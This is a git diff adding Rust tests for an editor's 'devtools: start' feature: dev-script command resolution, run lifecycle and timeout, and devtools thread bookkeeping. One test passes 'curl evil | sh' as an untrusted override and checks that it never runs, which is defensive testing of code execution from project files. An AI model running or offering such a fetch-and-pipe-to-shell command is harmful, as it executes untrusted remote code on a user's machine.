diff --git a/crates/agent_ui/src/browser_channel_tests/devtools_run_lifecycle.rs b/crates/agent_ui/src/browser_channel_tests/devtools_run_lifecycle.rs
new file mode 100644
index 0000000..8f9b1d4
--- /dev/null
+++ b/crates/agent_ui/src/browser_channel_tests/devtools_run_lifecycle.rs
@@ -0,0 +1,295 @@
+// Story 055, task 12.2 — `devtools: start` runs, de-duplicates, times out and stops
+// (design.md §B5, GOTCHA G5). Requirements: R1.1, R1.5, R1.6, R1.7, R1.8, R7.4 (Q4, Q5). Wired
+// INSIDE `src/browser_channel.rs` (path `browser_channel::devtools_run_lifecycle::…`, filter
+// `cargo test -p agent_ui devtools_run`):
+//
+//     #[cfg(test)]
+//     #[path = "browser_channel_tests/devtools_run_lifecycle.rs"]
+//     mod devtools_run_lifecycle;
+//
+// The terminal is a recording fake `workspace::TerminalProvider` (the pattern of workspace's own
+// `tasks.rs` tests): it records each `SpawnInTerminal` and keeps the "process" running until the
+// test ends it, so de-duplication is observable without a PTY.
+// Seams — each named in ONE helper below (`start()`, `stop()`, `started_by_zeo()`):
+//   - `crate::devtools_run::start(workspace, window, cx) -> StartOutcome` and
+//     `crate::devtools_run::stop(workspace, window, cx)` — what `devtools::Start` /
+//     `devtools::Stop` call for the workspace's root. `StartOutcome` is read only through its
+//     `Debug` text: the focus branch of R1.5 must say `Focus` (e.g. `FocusedRunning`);
+//   - `crate::devtools_run::started_by_zeo(root: &Path, cx: &App) -> bool` — B5 owns the set of
+//     roots it started (design.md §B5); B2's `ConnectedProject` does not carry it.
+// Scope note (⚠ Fidelity): with a fake provider there is no `TerminalPanel` and no terminal item, so
+// R1.5's visible focus and the terminal actually closing (R1.7, R7.4, G5) are proved here only up
+// to B5's decision — the focus branch taken, the root no longer started by Zeo. The process being
+// gone is task 16.2's `pgrep` check.
+//
+// Hostile halves first:
+//   - de-duplication is "while it is still running": a second start during the run hands NOTHING to
+//     the terminal provider — re-scheduling the same task is not focusing it, because Zed's
+//     terminal panel defers a non-concurrent rerun and starts it again when the first one ends —
+//     and a start after the run ended spawns again (wrongly blocked forever by a once-per-project
+//     flag);
+//   - the 60 s timeout: nothing at 59 s, one notification just after 60 s; `Announced(root)` at
+//     30 s cancels it;
+//   - stop is per origin: `devtools: stop` ends the server Zeo started, while for a root whose dev
+//     server the operator started by hand it stops nothing — the hand-started announce session
+//     stays — and says "No dev server started by Zeo for this project" (R1.8);
+//   - started_by_zeo is per root: only the root Zeo started is marked, not a root another dev
+//     server announced on its own.
+
+use std::path::Path;
+use std::process::ExitStatus;
+use std::sync::{Arc, Mutex};
+use std::time::Duration;
+
+use gpui::{App, AppContext as _, Task, TestAppContext, Window};
+use serde_json::{Value, json};
+use task::{RevealStrategy, SpawnInTerminal};
+use workspace::TerminalProvider;
+
+use super::test_support::*;
+
+#[derive(Clone, Default)]
+struct Recorder {
+    spawned: Arc<Mutex<Vec<SpawnInTerminal>>>,
+    exits: Arc<Mutex<Vec<smol::channel::Sender<()>>>>,
+}
+
+impl Recorder {
+    fn count(&self) -> usize {
+        self.spawned.lock().expect("lock").len()
+    }
+    fn last(&self) -> SpawnInTerminal {
+        self.spawned
+            .lock()
+            .expect("lock")
+            .last()
+            .cloned()
+            .expect("a spawn")
+    }
+    /// Ends every running fake process.
+    fn exit_all(&self) {
+        for tx in self.exits.lock().expect("lock").drain(..) {
+            tx.try_send(()).ok();
+        }
+    }
+}
+
+struct FakeTerminals(Recorder);
+
+impl TerminalProvider for FakeTerminals {
+    fn spawn(
+        &self,
+        task: SpawnInTerminal,
+        _window: &mut Window,
+        cx: &mut App,
+    ) -> Task<Option<anyhow::Result<ExitStatus>>> {
+        self.0.spawned.lock().expect("lock").push(task);
+        let (tx, rx) = smol::channel::bounded::<()>(1);
+        self.0.exits.lock().expect("lock").push(tx);
+        cx.background_spawn(async move {
+            rx.recv().await.ok();
+            Some(Ok(ExitStatus::default()))
+        })
+    }
+}
+
+async fn app_window(cx: &mut TestAppContext, root: &str, files: Value) -> (Win, Recorder) {
+    init(cx);
+    let fs = shared_fs(cx).await;
+    fs.insert_tree(root, files).await;
+    let mut win = window(&fs, root, None, cx).await;
+    let recorder = Recorder::default();
+    let provider = FakeTerminals(recorder.clone());
+    win.workspace.update(&mut win.cx, |workspace, _| {
+        workspace.set_terminal_provider(provider)
+    });
+    (win, recorder)
+}
+
+fn start(win: &mut Win) -> String {
+    let outcome = win
+        .workspace
+        .update_in(&mut win.cx, |workspace, window, cx| {
+            crate::devtools_run::start(workspace, window, cx)
+        });
+    win.cx.run_until_parked();
+    format!("{outcome:?}")
+}
+
+fn stop(win: &mut Win) {
+    win.workspace
+        .update_in(&mut win.cx, |workspace, window, cx| {
+            crate::devtools_run::stop(workspace, window, cx)
+        });
+    win.cx.run_until_parked();
+}
+
+fn started_by_zeo(root: &str, cx: &mut TestAppContext) -> bool {
+    cx.update(|cx| crate::devtools_run::started_by_zeo(Path::new(root), cx))
+}
+
+fn package() -> Value {
+    json!({ "package.json": json!({ "scripts": { "dev": "vite" } }).to_string(), "pnpm-lock.yaml": "" })
+}
+
+fn dev_hello(root: &str) -> Value {
+    json!({
+        "v": 2, "kind": "hello", "id": "h",
+        "client": {
+            "kind": "dev_server", "root": root,
+            "app_url": "http://localhost:5173", "panel_url": "http://localhost:5174"
+        }
+    })
+}
+
+#[gpui::test]
+async fn start_runs_the_dev_script_as_the_designed_task(cx: &mut TestAppContext) {
+    let (mut win, terminals) = app_window(cx, "/r/app", package()).await;
+    start(&mut win);
+    assert_eq!(terminals.count(), 1, "R1.1");
+    let task = terminals.last();
+    assert_eq!(task.label, "devtools: dev server");
+    assert_eq!(task.cwd.as_deref(), Some(Path::new("/r/app")));
+    let line = format!(
+        "{} {}",
+        task.command.clone().unwrap_or_default(),
+        task.args.join(" ")
+    );
+    assert!(
+        line.contains("pnpm") && line.contains("run dev"),
+        "R1.1: {line}"
+    );
+    assert!(task.use_new_terminal);
+    assert!(!task.allow_concurrent_runs);
+    assert_eq!(task.reveal, RevealStrategy::NoFocus);
+}
+
+#[gpui::test]
+async fn hostile_a_second_start_while_running_spawns_nothing_but_after_exit_it_runs_again(
+    cx: &mut TestAppContext,
+) {
+    let (mut win, terminals) = app_window(cx, "/r/app", package()).await;
+    start(&mut win);
+    let again = start(&mut win);
+    assert_eq!(
+        terminals.count(),
+        1,
+        "R1.5: no second dev server, not even a deferred rerun"
+    );
+    assert!(
+        again.contains("Focus"),
+        "R1.5: the running terminal is focused: {again}"
+    );
+    terminals.exit_all();
+    win.cx.run_until_parked();
+    start(&mut win);
+    assert_eq!(
+        terminals.count(),
+        2,
+        "the first one ended: start runs again"
+    );
+}
+
+#[gpui::test]
+async fn hostile_the_announce_timeout_fires_after_60_seconds_not_before(cx: &mut TestAppContext) {
+    let (mut win, _terminals) = app_window(cx, "/r/app", package()).await;
+    let before = win.notifications();
+    start(&mut win);
+    win.cx.executor().advance_clock(Duration::from_secs(59));
+    win.cx.run_until_parked();
+    assert_eq!(win.notifications(), before, "nothing at 59 s");
+    win.cx.executor().advance_clock(Duration::from_secs(2));
+    win.cx.run_until_parked();
+    assert_eq!(
+        win.notifications(),
+        before + 1,
+        "R1.6: one notification after 60 s"
+    );
+}
+
+#[gpui::test]
+async fn an_announce_within_60_seconds_cancels_the_timeout(cx: &mut TestAppContext) {
+    let (mut win, _terminals) = app_window(cx, "/r/app", package()).await;
+    let before = win.notifications();
+    start(&mut win);
+    win.cx.executor().advance_clock(Duration::from_secs(30));
+    let announce = open_session(1);
+    announce.handle(dev_hello("/r/app"), &win.app_state(), cx);
+    win.cx.executor().advance_clock(Duration::from_secs(40));
+    win.cx.run_until_parked();
+    assert_eq!(win.notifications(), before, "announced in time: no warning");
+}
+
+#[gpui::test]
+async fn no_dev_script_starts_nothing_and_says_so(cx: &mut TestAppContext) {
+    let (mut win, terminals) = app_window(cx, "/r/app", json!({ "README.md": "" })).await;
+    let before = win.notifications();
+    start(&mut win);
+    assert_eq!(terminals.count(), 0, "R1.4");
+    assert_eq!(
+        win.notifications(),
+        before + 1,
+        "R1.4: the operator is told"
+    );
+}
+
+#[gpui::test]
+async fn hostile_only_the_root_zeo_started_is_started_by_zeo(cx: &mut TestAppContext) {
+    let (mut win, _terminals) = app_window(cx, "/r/app", package()).await;
+    start(&mut win);
+    let zeo_started = open_session(1);
+    zeo_started.handle(dev_hello("/r/app"), &win.app_state(), cx);
+    // A dev server the operator started by hand, announcing a root Zeo never started (it need not
+    // be open in a window to announce).
+    let by_hand = open_session(2);
+    by_hand.handle(dev_hello("/p/app"), &win.app_state(), cx);
+    assert!(
+        started_by_zeo("/r/app", cx),
+        "R7.4: Zeo stops this one with the project"
+    );
+    assert!(!started_by_zeo("/p/app", cx), "R7.4: never this one");
+}
+
+#[gpui::test]
+async fn stop_ends_the_server_zeo_started(cx: &mut TestAppContext) {
+    let (mut win, terminals) = app_window(cx, "/r/app", package()).await;
+    start(&mut win);
+    assert!(started_by_zeo("/r/app", cx));
+    let before = win.notifications();
+    stop(&mut win);
+    assert!(
+        !started_by_zeo("/r/app", cx),
+        "R1.7: no longer a server Zeo runs"
+    );
+    assert_eq!(
+        win.notifications(),
+        before,
+        "R1.7: a real stop needs no notice"
+    );
+    start(&mut win);
+    assert_eq!(
+        terminals.count(),
+        2,
+        "stopped: the next start runs a new one"
+    );
+}
+
+#[gpui::test]
+async fn hostile_stop_never_touches_a_hand_started_server(cx: &mut TestAppContext) {
+    let (mut win, terminals) = app_window(cx, "/r/app", package()).await;
+    let by_hand = open_session(1);
+    by_hand.handle(dev_hello("/r/app"), &win.app_state(), cx);
+    by_hand.drain(cx);
+    let before = win.notifications();
+    stop(&mut win);
+    assert_eq!(
+        win.notifications(),
+        before + 1,
+        "R1.8: \"No dev server started by Zeo for this project\""
+    );
+    assert!(
+        !by_hand.closed(),
+        "R1.8: the operator's dev server keeps its session"
+    );
+    assert_eq!(terminals.count(), 0, "nothing started, nothing stopped");
+}
diff --git a/crates/agent_ui/src/browser_channel_tests/devtools_run_resolve.rs b/crates/agent_ui/src/browser_channel_tests/devtools_run_resolve.rs
new file mode 100644
index 0000000..5a518e5
--- /dev/null
+++ b/crates/agent_ui/src/browser_channel_tests/devtools_run_resolve.rs
@@ -0,0 +1,205 @@
+// Story 055, task 12.1 — which command `devtools: start` runs (design.md §B5, §B7, §Security
+// "Code execution from a project file"). Requirements: R1.1, R1.2, R1.3, R1.4 (Q4, Q5).
+// Wired INSIDE `src/browser_channel.rs` beside 045's modules (it reuses `test_support::init`), so
+// the path `browser_channel::devtools_run_resolve::…` matches the Validation filter
+// `cargo test -p agent_ui devtools_run`:
+//
+//     #[cfg(test)]
+//     #[path = "browser_channel_tests/devtools_run_resolve.rs"]
+//     mod devtools_run_resolve;
+//
+// Assumed seam — the ONLY lines naming it are in `resolve()` below; adjust there if it moved:
+//   `crate::devtools_run::resolve_dev_command(fs: &dyn Fs, root: &Path, dev_command:
+//   Option<String>, trusted: bool) -> impl Future<Output = anyhow::Result<ResolvedDevCommand>>`,
+//   where `ResolvedDevCommand` gives the command line it will run (`command_line()`) and the
+//   notification text when a project override was ignored (`notice: Option<String>`).
+//   Whether the trust bit comes from `TrustedWorktrees` is task 12.2's wiring; here it is an input.
+//
+// Hostile halves first:
+//   - detection order is a precedence, so each tie is tested in the direction that breaks a wrong
+//     order: `packageManager` beats every lockfile; `bun.lock` beats `pnpm-lock.yaml`;
+//     `pnpm-lock.yaml` beats `yarn.lock`; and `bun.lockb` (the binary lockfile) counts as bun;
+//   - "a dev script" is `scripts.dev` exactly: `dev:server`, `predev` or a top-level `dev` key are
+//     NOT one (wrongly accepted by a prefix or a whole-file search);
+//   - trust: an UNTRUSTED override never runs, and with no dev script nothing runs at all; a
+//     TRUSTED override runs even where no package.json exists.
+
+use std::path::Path;
+use std::sync::Arc;
+
+use fs::FakeFs;
+use gpui::TestAppContext;
+use serde_json::json;
+
+use super::test_support::*;
+
+const NO_DEV_SCRIPT: &str = "This project has no dev script";
+
+async fn resolve(
+    fs: &Arc<FakeFs>,
+    root: &str,
+    dev_command: Option<&str>,
+    trusted: bool,
+) -> Result<(String, Option<String>), String> {
+    crate::devtools_run::resolve_dev_command(
+        fs.as_ref(),
+        Path::new(root),
+        dev_command.map(str::to_string),
+        trusted,
+    )
+    .await
+    .map(|resolved| (resolved.command_line(), resolved.notice))
+    .map_err(|error| format!("{error:#}"))
+}
+
+async fn project(fs: &Arc<FakeFs>, root: &str, files: serde_json::Value) {
+    fs.insert_tree(root, files).await;
+}
+
+fn package(extra: serde_json::Value) -> String {
+    let mut base = json!({ "name": "app", "scripts": { "dev": "vite" } });
+    base.as_object_mut()
+        .expect("object")
+        .extend(extra.as_object().cloned().unwrap_or_default());
+    base.to_string()
+}
+
+#[gpui::test]
+async fn hostile_package_manager_field_beats_every_lockfile(cx: &mut TestAppContext) {
+    init(cx);
+    let fs = shared_fs(cx).await;
+    project(
+        &fs,
+        "/r/pm",
+        json!({
+            "package.json": package(json!({ "packageManager": "pnpm@9.12.0" })),
+            "bun.lock": "", "yarn.lock": "", "package-lock.json": "{}"
+        }),
+    )
+    .await;
+    assert_eq!(
+        resolve(&fs, "/r/pm", None, true).await.map(|r| r.0),
+        Ok("pnpm run dev".into())
+    );
+    project(
+        &fs,
+        "/r/yarn-hash",
+        json!({
+            "package.json": package(json!({ "packageManager": "yarn@4.5.0+sha512.0123abcd" })),
+            "pnpm-lock.yaml": ""
+        }),
+    )
+    .await;
+    assert_eq!(
+        resolve(&fs, "/r/yarn-hash", None, true).await.map(|r| r.0),
+        Ok("yarn run dev".into()),
+        "a corepack hash suffix is still yarn"
+    );
+}
+
+#[gpui::test]
+async fn hostile_lockfile_precedence_bun_then_pnpm_then_yarn_then_npm(cx: &mut TestAppContext) {
+    init(cx);
+    let fs = shared_fs(cx).await;
+    project(
+        &fs,
+        "/r/bun-pnpm",
+        json!({ "package.json": package(json!({})), "bun.lock": "", "pnpm-lock.yaml": "" }),
+    )
+    .await;
+    project(
+        &fs,
+        "/r/bunb",
+        json!({ "package.json": package(json!({})), "bun.lockb": "\u{0}" }),
+    )
+    .await;
+    project(
+        &fs,
+        "/r/pnpm-yarn",
+        json!({ "package.json": package(json!({})), "pnpm-lock.yaml": "", "yarn.lock": "" }),
+    )
+    .await;
+    project(
+        &fs,
+        "/r/yarn",
+        json!({ "package.json": package(json!({})), "yarn.lock": "" }),
+    )
+    .await;
+    project(&fs, "/r/npm", json!({ "package.json": package(json!({})) })).await;
+    for (root, expected) in [
+        ("/r/bun-pnpm", "bun run dev"),
+        ("/r/bunb", "bun run dev"),
+        ("/r/pnpm-yarn", "pnpm run dev"),
+        ("/r/yarn", "yarn run dev"),
+        ("/r/npm", "npm run dev"),
+    ] {
+        assert_eq!(
+            resolve(&fs, root, None, true).await.map(|r| r.0),
+            Ok(expected.to_string()),
+            "{root}"
+        );
+    }
+}
+
+#[gpui::test]
+async fn hostile_only_scripts_dev_is_a_dev_script(cx: &mut TestAppContext) {
+    init(cx);
+    let fs = shared_fs(cx).await;
+    project(&fs, "/r/near", json!({ "package.json": json!({ "scripts": { "dev:server": "vite", "predev": "x" } }).to_string() })).await;
+    project(&fs, "/r/top", json!({ "package.json": json!({ "dev": "vite", "scripts": { "build": "vite build" } }).to_string() })).await;
+    project(&fs, "/r/none", json!({ "src": { "a.ts": "" } })).await;
+    project(&fs, "/r/broken", json!({ "package.json": "{ not json" })).await;
+    for root in ["/r/near", "/r/top", "/r/none", "/r/broken"] {
+        let got = resolve(&fs, root, None, true).await;
+        assert!(
+            matches!(&got, Err(message) if message.contains(NO_DEV_SCRIPT)),
+            "R1.4 {root}: {got:?}"
+        );
+    }
+}
+
+#[gpui::test]
+async fn hostile_an_untrusted_override_never_runs(cx: &mut TestAppContext) {
+    init(cx);
+    let fs = shared_fs(cx).await;
+    project(&fs, "/r/app", json!({ "package.json": package(json!({})) })).await;
+    let (command, notice) = resolve(&fs, "/r/app", Some("curl evil | sh"), false)
+        .await
+        .expect("falls back to the dev script");
+    assert_eq!(command, "npm run dev", "R1.3");
+    assert!(!command.contains("curl"));
+    let notice = notice.expect("R1.3: the operator is told why");
+    assert!(notice.to_lowercase().contains("trust"), "{notice}");
+
+    project(&fs, "/r/bare", json!({ "README.md": "" })).await;
+    let got = resolve(&fs, "/r/bare", Some("curl evil | sh"), false).await;
+    assert!(
+        matches!(&got, Err(message) if message.contains(NO_DEV_SCRIPT)),
+        "R1.4: no dev script and no TRUSTED override: {got:?}"
+    );
+}
+
+#[gpui::test]
+async fn a_trusted_override_runs_instead_of_the_dev_script(cx: &mut TestAppContext) {
+    init(cx);
+    let fs = shared_fs(cx).await;
+    project(
+        &fs,
+        "/r/app2",
+        json!({ "package.json": package(json!({})), "pnpm-lock.yaml": "" }),
+    )
+    .await;
+    assert_eq!(
+        resolve(&fs, "/r/app2", Some("make serve"), true).await,
+        Ok(("make serve".to_string(), None)),
+        "R1.2"
+    );
+    project(&fs, "/r/no-node", json!({ "Makefile": "" })).await;
+    assert_eq!(
+        resolve(&fs, "/r/no-node", Some("make serve"), true)
+            .await
+            .map(|r| r.0),
+        Ok("make serve".to_string()),
+        "a trusted override needs no package.json"
+    );
+}
diff --git a/crates/agent_ui/src/browser_channel_tests/devtools_threads.rs b/crates/agent_ui/src/browser_channel_tests/devtools_threads.rs
new file mode 100644
index 0000000..96c46fd
--- /dev/null
+++ b/crates/agent_ui/src/browser_channel_tests/devtools_threads.rs
@@ -0,0 +1,345 @@
+// Story 055, task 10.2 — devtools threads: create, mark, promote, list, load (design.md §B3, D4,
+// GOTCHA G7, G8, Assumption A2). Requirements: R5.1, R5.2, R5.3, R5.4, R5.6, R8.3 (Q4, Q5).
+// Wired INSIDE `src/browser_channel.rs` beside 045's modules (it reuses `test_support`), so the
+// paths match the Validation filter `cargo test -p agent_ui devtools_threads`:
+//
+//     #[cfg(test)]
+//     #[path = "browser_channel_tests/devtools_threads.rs"]
+//     mod devtools_threads;
+//
+// Assumed seams (design.md §B3 Interface) — the ONLY lines naming them are in the `seam` module
+// below; adjust them there if a signature moved:
+//   - `crate::devtools_threads::create(root: &Path, cx: &mut App) -> Task<Result<ThreadInfo>>`
+//     (the window is resolved by root inside, per §B3), answering after the connection is ready;
+//   - `crate::devtools_threads::list(root: &Path, cx: &App) -> Vec<ThreadInfo>`;
+//   - `crate::devtools_threads::is_devtools_of(thread_id: &str, root: &Path, cx: &App) -> bool`
+//     (`thread_id` in wire form, `ThreadId::to_key_string`);
+//   - `crate::devtools_threads::ensure_loaded(thread_id: &str, cx: &mut App) -> Task<Result<()>>`;
+//   - `DevtoolsThreads::global(cx).read(cx).is_devtools(ThreadId) -> Option<PathBuf>` (memory ∪
+//     store; what the sidebar's badge reads, design.md §B3/§B8);
+//   - the persisted mark is `ThreadOrganization::devtools_root` (task 10.1), written on promotion
+//     through `ThreadOrganizationStore::set_devtools_root(thread_id, root)`.
+// Promotion is triggered the way design §B3 says it happens: the first `ThreadMetadataStore` save
+// carrying a `session_id` for the marked thread.
+//
+// Hostile halves first (R5.5's identity, at the registry):
+//   - an EDITOR thread in the same project is not a devtools thread of it, a devtools thread of
+//     ANOTHER project is not one of this project, and an unknown id is not one — while the same root
+//     spelled `/p/app/` still recognises its own thread (wrongly split by string comparison);
+//   - creation never moves the editor: the window's active thread is the same entity after create;
+//   - the draft rule: a devtools thread with no message has NO persisted mark (so a restart drops
+//     it, R5.3), while the promoted one does (R5.2);
+//   - `is_devtools` reads memory ∪ store: an UNPROMOTED thread (memory only) and a promoted one
+//     (store) both answer their root, an editor thread answers None (a store-only reader would
+//     leave every new browser thread unbadged until its first message).
+
+use std::path::Path;
+
+use acp_thread::StubAgentConnection;
+use gpui::TestAppContext;
+
+use super::test_support::*;
+use crate::thread_metadata_store::{ThreadId, ThreadMetadataStore};
+use crate::thread_organization::ThreadOrganizationStore;
+
+mod seam {
+    use std::path::Path;
+
+    use anyhow::Result;
+    use gpui::TestAppContext;
+
+    use crate::browser_wire::ThreadInfo;
+
+    pub async fn create(root: &str, cx: &mut TestAppContext) -> Result<ThreadInfo> {
+        let task = cx.update(|cx| crate::devtools_threads::create(Path::new(root), cx));
+        cx.run_until_parked();
+        task.await
+    }
+    pub fn list(root: &str, cx: &mut TestAppContext) -> Vec<ThreadInfo> {
+        cx.update(|cx| crate::devtools_threads::list(Path::new(root), cx))
+    }
+    pub fn is_devtools_of(thread_id: &str, root: &str, cx: &mut TestAppContext) -> bool {
+        cx.update(|cx| crate::devtools_threads::is_devtools_of(thread_id, Path::new(root), cx))
+    }
+    pub async fn ensure_loaded(thread_id: &str, cx: &mut TestAppContext) -> Result<()> {
+        let task = cx.update(|cx| crate::devtools_threads::ensure_loaded(thread_id, cx));
+        cx.run_until_parked();
+        task.await
+    }
+}
+
+fn thread_id_of(key: &str, cx: &mut TestAppContext) -> ThreadId {
+    cx.update(|cx| {
+        ThreadMetadataStore::global(cx)
+            .read(cx)
+            .entry_ids()
+            .find(|id| id.to_key_string() == key)
+            .unwrap_or_else(|| panic!("{key} is a known thread"))
+    })
+}
+
+/// What `ThreadOrganizationStore` holds as the persisted devtools root of `key`.
+fn persisted_root(key: &str, cx: &mut TestAppContext) -> Option<String> {
+    let id = thread_id_of(key, cx);
+    cx.update(|cx| {
+        ThreadOrganizationStore::global(cx)
+            .read(cx)
+            .organization(id)
+            .and_then(|org| {
+                org.devtools_root
+                    .as_ref()
+                    .map(|r| Path::new(r).display().to_string())
+            })
+    })
+}
+
+/// The save the conversation makes when the first message goes out: the draft gains a session.
+fn promote(key: &str, cx: &mut TestAppContext) {
+    let id = thread_id_of(key, cx);
+    cx.update(|cx| {
+        let store = ThreadMetadataStore::global(cx);
+        let mut metadata = store
+            .read(cx)
+            .entry(id)
+            .cloned()
+            .expect("metadata of a created thread");
+        metadata.session_id = Some(agent_client_protocol::v2::schema::SessionId::new(format!(
+            "session-{key}"
+        )));
+        store.update(cx, |store, cx| store.save(metadata, cx));
+    });
+    cx.run_until_parked();
+}
+
+#[gpui::test]
+async fn hostile_an_editor_thread_another_projects_thread_and_an_unknown_id_are_not_devtools_threads(
+    cx: &mut TestAppContext,
+) {
+    init(cx);
+    let fs = shared_fs(cx).await;
+    let app = window(&fs, "/p/app", Some(StubAgentConnection::new()), cx).await;
+    let _web = window(&fs, "/p/web", Some(StubAgentConnection::new()), cx).await;
+    let editor = crate::test_support::active_thread_id(&app.panel, &app.cx).to_key_string();
+    let web_devtools = seam::create("/p/web", cx).await.expect("created in /p/web");
+
+    assert!(
+        !seam::is_devtools_of(&editor, "/p/app", cx),
+        "an editor thread, same project"
+    );
+    assert!(
+        !seam::is_devtools_of(&web_devtools.thread_id, "/p/app", cx),
+        "a devtools thread of another project"
+    );
+    assert!(
+        !seam::is_devtools_of("00000000-0000-0000-0000-000000000000", "/p/app", cx),
+        "an id that exists nowhere"
+    );
+
+    let mine = seam::create("/p/app", cx).await.expect("created in /p/app");
+    assert!(seam::is_devtools_of(&mine.thread_id, "/p/app", cx));
+    assert!(
+        seam::is_devtools_of(&mine.thread_id, "/p/app/", cx),
+        "the same root, spelled with a trailing slash"
+    );
+}
+
+#[gpui::test]
+async fn hostile_creating_a_devtools_thread_never_changes_the_editors_thread(
+    cx: &mut TestAppContext,
+) {
+    init(cx);
+    let fs = shared_fs(cx).await;
+    let app = window(&fs, "/p/app", Some(StubAgentConnection::new()), cx).await;
+    let before = app.thread().entity_id();
+    let created = seam::create("/p/app", cx).await.expect("created (R5.1)");
+    assert_eq!(
+        app.thread().entity_id(),
+        before,
+        "A2: the editor's view never moves"
+    );
+    assert_ne!(
+        crate::test_support::active_thread_id(&app.panel, &app.cx).to_key_string(),
+        created.thread_id
+    );
+    assert_eq!(
+        created.project, "app",
+        "ThreadInfo.project names the project"
+    );
+}
+
+#[gpui::test]
+async fn list_is_this_roots_devtools_threads_only_newest_first(cx: &mut TestAppContext) {
+    init(cx);
+    let fs = shared_fs(cx).await;
+    let app = window(&fs, "/p/app", Some(StubAgentConnection::new()), cx).await;
+    let _web = window(&fs, "/p/web", None, cx).await;
+    let editor = crate::test_support::active_thread_id(&app.panel, &app.cx).to_key_string();
+    let first = seam::create("/p/app", cx).await.expect("first");
+    cx.executor()
+        .advance_clock(std::time::Duration::from_secs(1));
+    let second = seam::create("/p/app", cx).await.expect("second");
+    let other = seam::create("/p/web", cx).await.expect("web");
+
+    let ids: Vec<String> = seam::list("/p/app", cx)
+        .into_iter()
+        .map(|t| t.thread_id)
+        .collect();
+    assert_eq!(
+        ids,
+        vec![second.thread_id.clone(), first.thread_id.clone()],
+        "R5.4"
+    );
+    assert!(!ids.contains(&editor), "never an editor thread");
+    assert!(
+        !ids.contains(&other.thread_id),
+        "never another project's thread"
+    );
+}
+
+#[gpui::test]
+async fn list_holds_at_most_fifty(cx: &mut TestAppContext) {
+    init(cx);
+    let fs = shared_fs(cx).await;
+    let _app = window(&fs, "/p/app", None, cx).await;
+    for _ in 0..51 {
+        seam::create("/p/app", cx).await.expect("created");
+    }
+    assert_eq!(seam::list("/p/app", cx).len(), 50);
+}
+
+#[gpui::test]
+async fn hostile_only_the_promoted_thread_carries_a_persisted_mark(cx: &mut TestAppContext) {
+    init(cx);
+    let fs = shared_fs(cx).await;
+    let _app = window(&fs, "/p/app", None, cx).await;
+    let empty = seam::create("/p/app", cx).await.expect("empty");
+    let used = seam::create("/p/app", cx).await.expect("used");
+    promote(&used.thread_id, cx);
+    assert_eq!(
+        persisted_root(&used.thread_id, cx).as_deref(),
+        Some("/p/app"),
+        "R5.2: persisted on its first message"
+    );
+    assert_eq!(
+        persisted_root(&empty.thread_id, cx),
+        None,
+        "R5.3: an empty devtools thread leaves nothing to survive a restart"
+    );
+    // The in-memory mark still makes the empty one a devtools thread for this run.
+    assert!(seam::is_devtools_of(&empty.thread_id, "/p/app", cx));
+}
+
+#[gpui::test]
+async fn a_promoted_thread_keeps_its_mark_when_other_organization_changes(cx: &mut TestAppContext) {
+    init(cx);
+    let fs = shared_fs(cx).await;
+    let _app = window(&fs, "/p/app", None, cx).await;
+    let used = seam::create("/p/app", cx).await.expect("used");
+    promote(&used.thread_id, cx);
+    let id = thread_id_of(&used.thread_id, cx);
+    // Pinning writes other columns of the same row: the column-scoped upsert keeps the mark.
+    cx.update(|cx| {
+        ThreadOrganizationStore::global(cx).update(cx, |store, cx| {
+            store.pin(id, cx).expect("a promoted thread can be pinned");
+        })
+    });
+    cx.run_until_parked();
+    assert_eq!(
+        persisted_root(&used.thread_id, cx).as_deref(),
+        Some("/p/app")
+    );
+}
+
+#[gpui::test]
+async fn ensure_loaded_never_changes_the_editors_thread(cx: &mut TestAppContext) {
+    init(cx);
+    let fs = shared_fs(cx).await;
+    let app = window(&fs, "/p/app", Some(StubAgentConnection::new()), cx).await;
+    let used = seam::create("/p/app", cx).await.expect("used");
+    promote(&used.thread_id, cx);
+    let before = app.thread().entity_id();
+    seam::ensure_loaded(&used.thread_id, cx)
+        .await
+        .expect("loads (R5.6)");
+    assert_eq!(
+        app.thread().entity_id(),
+        before,
+        "A2: loaded in the background"
+    );
+    assert!(seam::is_devtools_of(&used.thread_id, "/p/app", cx));
+}
+
+#[gpui::test]
+async fn creation_with_no_window_on_the_root_is_an_error_naming_it(cx: &mut TestAppContext) {
+    init(cx);
+    let fs = shared_fs(cx).await;
+    let _web = window(&fs, "/p/web", None, cx).await;
+    let error = seam::create("/p/app", cx)
+        .await
+        .expect_err("no window holds /p/app");
+    assert!(
+        format!("{error:#}").contains("/p/app"),
+        "Q4: the error names the root: {error:#}"
+    );
+}
+
+#[gpui::test]
+async fn a_devtools_thread_is_an_ordinary_thread_of_its_project(cx: &mut TestAppContext) {
+    init(cx);
+    let fs = shared_fs(cx).await;
+    let _app = window(&fs, "/p/app", None, cx).await;
+    let used = seam::create("/p/app", cx).await.expect("used");
+    promote(&used.thread_id, cx);
+    let id = thread_id_of(&used.thread_id, cx);
+    cx.update(|cx| {
+        let store = ThreadMetadataStore::global(cx);
+        let metadata = store
+            .read(cx)
+            .entry(id)
+            .expect("listed in the thread store (R8.3)");
+        assert!(!metadata.archived);
+        assert!(
+            metadata.references_folder_path(Path::new("/p/app")),
+            "listed under its project, like any thread"
+        );
+    });
+}
+
+fn is_devtools(key: &str, cx: &mut TestAppContext) -> Option<String> {
+    let id = thread_id_of(key, cx);
+    cx.update(|cx| {
+        crate::devtools_threads::DevtoolsThreads::global(cx)
+            .read(cx)
+            .is_devtools(id)
+            .map(|root| root.display().to_string())
+    })
+}
+
+#[gpui::test]
+async fn hostile_is_devtools_answers_for_unpromoted_and_promoted_threads_alike(
+    cx: &mut TestAppContext,
+) {
+    init(cx);
+    let fs = shared_fs(cx).await;
+    let app = window(&fs, "/p/app", Some(StubAgentConnection::new()), cx).await;
+    let editor = crate::test_support::active_thread_id(&app.panel, &app.cx).to_key_string();
+    let fresh = seam::create("/p/app", cx).await.expect("fresh");
+    let used = seam::create("/p/app", cx).await.expect("used");
+    promote(&used.thread_id, cx);
+    assert_eq!(
+        persisted_root(&fresh.thread_id, cx),
+        None,
+        "fresh lives in memory only"
+    );
+    assert_eq!(
+        is_devtools(&fresh.thread_id, cx).as_deref(),
+        Some("/p/app"),
+        "memory"
+    );
+    assert_eq!(
+        is_devtools(&used.thread_id, cx).as_deref(),
+        Some("/p/app"),
+        "store"
+    );
+    assert_eq!(is_devtools(&editor, cx), None, "an editor thread");
+}
diff --git a/crates/agent_ui/src/browser_channel_tests/devtools_threads_idle_reload.rs b/crates/agent_ui/src/browser_channel_tests/devtools_threads_idle_reload.rs
new file mode 100644
index 0000000..699ebaa
--- /dev/null
